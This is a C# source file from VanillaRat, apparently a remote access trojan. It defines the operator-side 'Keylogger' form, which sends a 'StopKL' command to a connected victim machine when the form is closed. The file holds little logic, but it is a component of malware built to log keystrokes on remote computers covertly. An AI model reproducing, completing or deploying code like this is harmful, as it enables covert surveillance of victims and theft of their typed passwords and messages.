using System.Text;
using System.Windows.Forms;
using VanillaRat.Classes;

namespace VanillaRat.Forms
{
    public partial class Keylogger : Form
    {
        public Keylogger()
        {
            InitializeComponent();
        }

        public int ConnectionId { get; set; }

        //Stop keylogger 
        private void Keylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            Server.MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StopKL"));
        }
    }
}